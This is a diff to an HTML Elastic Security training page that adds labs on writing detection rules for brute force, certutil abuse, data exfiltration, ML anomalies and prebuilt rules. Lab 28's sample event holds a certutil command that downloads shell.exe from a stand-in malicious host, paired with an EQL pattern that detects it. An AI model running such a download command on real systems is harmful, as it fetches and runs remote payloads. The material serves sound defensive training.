@@ -2820,7 +2820,7 @@ sudo systemctl restart elasticsearch.service</pre>
         <div class="mod-badge" style="background:#4a148c">7</div>
         <div>
           <div class="mod-title">Module 7: Advanced Use Cases &amp; Day 2 Ops</div>
-          <div class="mod-desc">Labs 22-26 · Security hunting, APM debugging, ILM, Hot Threads</div>
+          <div class="mod-desc">Labs 22-31 · Security hunting, APM debugging, ILM, Hot Threads, Detection Rules</div>
         </div>
         <div class="mod-expand-all">
           <button onclick="expandAll(7)">Expand All</button>
@@ -3152,6 +3152,162 @@ PUT _cluster/settings
           <div class="expected">
             <div class="expected-label">&#9654; Expected Output</div>
             <pre># Look at the deciders portion of the response. You should see node_match returning NO because the node does not match the requested storage: high_io attribute.</pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- LAB 27 -->
+      <div class="lab-card" id="lab27">
+        <div class="lab-header" onclick="toggleLab(this)">
+          <div class="lab-num">L27</div>
+          <div class="lab-meta">
+            <div class="lab-title">Lab 27: Brute Force Detection (Threshold)</div>
+            <div class="lab-goal">Create a threshold rule to catch failed login spikes</div>
+          </div>
+          <div class="toggle-icon">&#9654;</div>
+        </div>
+        <div class="lab-body">
+          <div class="trainer-note"> Threshold rules are the simplest way to catch high-volume attacks like brute force.
+            Grouping by `source.ip` ensures you catch the specific attacker.
+          </div>
+          <h4>Create Rule</h4>
+          <p>Security > Rules > Create New Rule > <b>Threshold</b></p>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">&#128203; Copy</button>
+            <pre>event.category : "authentication" AND event.outcome : "failure"</pre>
+          </div>
+          <p><b>Threshold</b>: Group by <code>source.ip</code>, Count > 10, Window 5m.</p>
+          <h4>Test Data</h4>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">&#128203; Copy</button>
+            <pre>POST /logs-system.auth-default/_doc
+{
+  "@timestamp": "2026-03-04T10:00:00Z",
+  "event.category": "authentication",
+  "event.outcome": "failure",
+  "source.ip": "192.168.1.50",
+  "user.name": "admin",
+  "message": "Failed password for admin"
+}</pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- LAB 28 -->
+      <div class="lab-card" id="lab28">
+        <div class="lab-header" onclick="toggleLab(this)">
+          <div class="lab-num">L28</div>
+          <div class="lab-meta">
+            <div class="lab-title">Lab 28: Suspicious Process (EQL)</div>
+            <div class="lab-goal">Use EQL to detect Living off the Land tools (certutil)</div>
+          </div>
+          <div class="toggle-icon">&#9654;</div>
+        </div>
+        <div class="lab-body">
+          <div class="trainer-note"> EQL is perfect for looking for specific process sequences or argument patterns that
+            indicate exploitation.
+          </div>
+          <h4>Create EQL Rule</h4>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">&#128203; Copy</button>
+            <pre>process where process.name == "certutil.exe" and 
+process.args : ("*urlcache*", "*split*", "*download*")</pre>
+          </div>
+          <h4>Ingest Sample Event</h4>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">&#128203; Copy</button>
+            <pre>POST /logs-endpoint.events.process-default/_doc
+{
+  "@timestamp": "2026-03-04T10:05:00Z",
+  "process.name": "certutil.exe",
+  "process.args": ["-urlcache", "-split", "-f", "http://malicious-site.com/shell.exe"],
+  "host.name": "HR-Laptop-01",
+  "user.name": "jdoe"
+}</pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- LAB 29 -->
+      <div class="lab-card" id="lab29">
+        <div class="lab-header" onclick="toggleLab(this)">
+          <div class="lab-num">L29</div>
+          <div class="lab-meta">
+            <div class="lab-title">Lab 29: Data Exfiltration (ES|QL)</div>
+            <div class="lab-goal">New in v8: Use ES|QL pipes for advanced detection logic</div>
+          </div>
+          <div class="toggle-icon">&#9654;</div>
+        </div>
+        <div class="lab-body">
+          <div class="trainer-note"> ES|QL allows you to perform calculations (SUM) and filtering in a single pipe-based
+            rule, making it much more powerful than KQL for exfiltration detecton.
+          </div>
+          <h4>ES|QL Detection Query</h4>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">&#128203; Copy</button>
+            <pre>FROM logs-network*
+| STATS total_bytes = SUM(destination.bytes) BY source.ip, user.name
+| WHERE total_bytes > 500000000
+| SORT total_bytes DESC</pre>
+          </div>
+          <h4>Ingest High Traffic Sample</h4>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">&#128203; Copy</button>
+            <pre>POST /logs-network-default/_doc
+{
+  "@timestamp": "2026-03-04T10:10:00Z",
+  "source.ip": "10.0.0.5",
+  "user.name": "v.kumar",
+  "destination.bytes": 600000000,
+  "destination.ip": "203.0.113.10"
+}</pre>
+          </div>
+        </div>
+      </div>
+
+      <!-- LAB 30 -->
+      <div class="lab-card" id="lab30">
+        <div class="lab-header" onclick="toggleLab(this)">
+          <div class="lab-num">L30</div>
+          <div class="lab-meta">
+            <div class="lab-title">Lab 30: Anomaly Detection (ML)</div>
+            <div class="lab-goal">Detect "Improbable Access" with Machine Learning</div>
+          </div>
+          <div class="toggle-icon">&#9654;</div>
+        </div>
+        <div class="lab-body">
+          <div class="trainer-note"> ML rules automatically learn the baseline of "normal" for every user and flag
+            deviations (like a user logging in from a new country) without manual configuration.
+          </div>
+          <p>1. Create ML Job in <b>Machine Learning</b> > <b>Anomaly Detection</b>.</p>
+          <p>2. Select <code>rare</code> detector on <code>source.geo.country_iso_code</code>.</p>
+          <p>3. Create Security Rule of type <b>Machine Learning</b> with threshold score <b>> 75</b>.</p>
+        </div>
+      </div>
+
+      <!-- LAB 31 -->
+      <div class="lab-card" id="lab31">
+        <div class="lab-header" onclick="toggleLab(this)">
+          <div class="lab-num">L31</div>
+          <div class="lab-meta">
+            <div class="lab-title">Lab 31: Prebuilt Rules API</div>
+            <div class="lab-goal">Bulk install Elastic's official security rules</div>
+          </div>
+          <div class="toggle-icon">&#9654;</div>
+        </div>
+        <div class="lab-body">
+          <div class="trainer-note"> Use this API to instantly load over 800 high-quality detection rules into the
+            cluster.
+          </div>
+          <h4>Install via API</h4>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">&#128203; Copy</button>
+            <pre>PUT /api/detection_engine/rules/prebuilt</pre>
+          </div>
+          <h4>Verify Counts</h4>
+          <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">&#128203; Copy</button>
+            <pre>GET /api/detection_engine/rules/_find?per_page=1</pre>
           </div>
         </div>
       </div>
